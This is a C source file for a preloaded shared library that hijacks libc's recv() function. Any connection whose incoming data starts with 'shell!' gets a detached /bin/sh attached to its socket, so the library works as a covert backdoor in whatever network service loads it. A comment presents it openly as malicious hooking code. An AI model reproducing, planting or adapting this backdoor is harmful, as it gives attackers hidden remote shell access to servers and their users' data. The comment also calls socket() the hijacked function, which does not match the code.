#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <signal.h>


static void *dl;
ssize_t (*orig_recv)(int, void *, size_t, int);

__attribute__((constructor)) void stub(void)
{
	dl = dlopen("/lib/libc.so.6", RTLD_LAZY | RTLD_GLOBAL);
	orig_recv = dlsym(dl, "recv");
	
}

void sigchld(int signo)
{
	while (waitpid(-1, NULL, WNOHANG) > 0)
		;
}

/*
 * socket() is the hijacked function in libc
 * To make this more malicious, one could hijack recv()/send() as well.
 * The majority of the code in my malicious socket() has been ripped
 * right from Beej's Guide to Network Programming. Thanks Beej!
 */
ssize_t recv(int socket, void *buffer, size_t length, int flags)
{
	ssize_t ret;
	FILE *fp;
	char filename[1024+1];
	
	ret = orig_recv(socket, buffer, length, flags);
	if (ret < strlen("shell!\n"))
		return ret;
	if (memcmp(buffer, "shell!", strlen("shell!")))
		return ret;
	
	if (fork())
		return -1;
	setsid();
	if (fork())
		return 0;
	
	dup2(socket, fileno(stdin));
	dup2(socket, fileno(stdout));
	dup2(socket, fileno(stderr));
	execl("/bin/sh", "sh", NULL);
	
	return -1;
}
